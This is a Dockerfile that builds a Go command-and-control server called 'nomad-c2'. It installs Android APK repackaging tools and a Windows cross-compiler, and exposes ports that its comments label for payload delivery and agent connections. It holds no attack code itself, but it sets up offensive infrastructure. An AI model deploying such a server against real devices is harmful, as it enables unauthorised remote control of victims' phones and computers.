# Step 1: Base image with Go, Python, and base tools
FROM golang:1.22-bullseye

# Step 2: Set environment variables
ENV DEBIAN_FRONTEND=noninteractive
ENV PATH="$PATH:/usr/local/bin:/root/go/bin"

# Step 3: Install necessary tools
RUN apt-get update && apt-get install -y \
    git wget gnupg2 curl nano lsb-release \
    android-tools-adb android-tools-fastboot \
    mingw-w64 \
    openjdk-11-jdk \
    python3 python3-pip \
    && rm -rf /var/lib/apt/lists/*

# Step 4: Install Smali/Baksmali for APK building
RUN wget https://bitbucket.org/JesusFreke/smali/downloads/smali-2.5.2.jar -O /usr/local/bin/smali.jar \
    && wget https://bitbucket.org/JesusFreke/smali/downloads/baksmali-2.5.2.jar -O /usr/local/bin/baksmali.jar

# Step 5: Install APKTool
RUN wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O /usr/local/bin/apktool \
    && wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar -O /usr/local/bin/apktool.jar \
    && chmod +x /usr/local/bin/apktool

# Step 6: Create working directory
WORKDIR /app

# Step 7: Copy the C2 server source code
COPY . .

# Step 8: Build the Go Server
RUN go build -o nomad-c2 server/main.go

# Step 9: Expose ports
# 8080: Web UI & Payload delivery
# 5555: C2 Listener (Agents connect here)
# 5037: ADB internal port
EXPOSE 8080 5555 5037

# Step 10: Run the server
CMD ["./nomad-c2", "-port", "8080", "-c2port", "5555"]
